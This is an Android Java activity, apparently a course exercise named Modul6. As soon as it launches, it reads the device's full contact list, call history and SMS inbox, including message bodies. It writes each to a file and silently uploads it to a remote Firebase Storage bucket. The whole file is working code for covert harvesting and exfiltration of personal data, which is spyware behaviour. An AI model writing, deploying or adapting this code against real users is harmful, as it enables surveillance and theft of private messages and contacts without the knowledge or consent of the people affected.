package com.example.Modul6;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity{
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermission();

        getContactList();
        getCallDetails();
        getSmsDetails();

    }

    private void requestPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 1);
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        }

    }

    private void uploadFirebase(Uri fileUri) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());

        String filePath = fileUri.getPath();
        String[] segments = filePath.split("/");
        String fileName = segments[segments.length - 1];
        Log.d("fileName", fileName); // In ra "contacts202203101415.txt"

//        String fileName = getFileNameFromUri(fileUri);

        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
        StorageReference contactsRef = storageRef.child("data" + currentTime+ "/"+ fileName);

        UploadTask uploadTask = contactsRef.putFile(fileUri);
        // Upload file to Firebase Storage
        uploadTask.addOnSuccessListener(taskSnapshot -> {
                    // File uploaded successfully
                    Log.d("uploadFirebase", "File uploaded successfully");
                })
                .addOnFailureListener(e -> {
                    // Handle unsuccessful uploads
                    Log.e("uploadFirebase", "Error uploading file", e);
                });
    }
    private void getContactList() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());
//        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "contacts" + currentTime + ".txt");

        // Tạo tệp tin bằng lớp MediaStore
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "contacts" + currentTime + ".txt");
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Query danh sách liên hệ
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            // Lưu danh sách liên hệ vào tệp tin
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                String line = name + ", " + phone + "\n";
                outputStream.write(line.getBytes());
                Log.d("getContact", name + ", " + phone + "\n");
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        uploadFirebase(uri);
    }
    private void getCallDetails() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());
//        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "callDetails" + currentTime + ".txt");

        // Tạo tệp tin bằng lớp MediaStore
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "callDetails" + currentTime + ".txt");
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Lấy cursor để truy vấn lịch sử cuộc gọi
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                String line = number + ", " + name +", "+ duration +", "+ type +", "+ date + "\n";
                outputStream.write(line.getBytes());
                Log.d("getCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        uploadFirebase(uri);
    }
    private void getSmsDetails() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "SmsDetails" + currentTime + ".txt");

        // Tạo tệp tin bằng lớp MediaStore
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "smsDetails" + currentTime + ".txt");
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Lấy cursor để truy vấn tin nhắn
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String date = cursor.getString(cursor.getColumnIndex("date"));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                String line = address + ", " + body +", "+ date + "\n";
                outputStream.write(line.getBytes());
                Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        uploadFirebase(uri);
    }

}